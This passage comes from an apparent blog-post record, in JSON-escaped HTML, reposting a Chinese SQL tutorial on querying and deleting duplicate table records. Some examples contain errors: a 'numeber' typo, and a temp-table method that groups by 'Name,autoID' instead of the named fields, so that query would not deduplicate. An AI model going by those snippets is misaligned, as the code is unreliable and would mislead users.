style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div>\n</div>","source":"_posts/SQL重复记录查询（转载）.md","raw":"---\ntitle: SQL重复记录查询（转载）\ndate: 2016-10-05 19:34:04\ntags: Sql\ncategories: Sql\n---\n<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font> * <font color=\"#0000ff\">from</font> testtable</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" 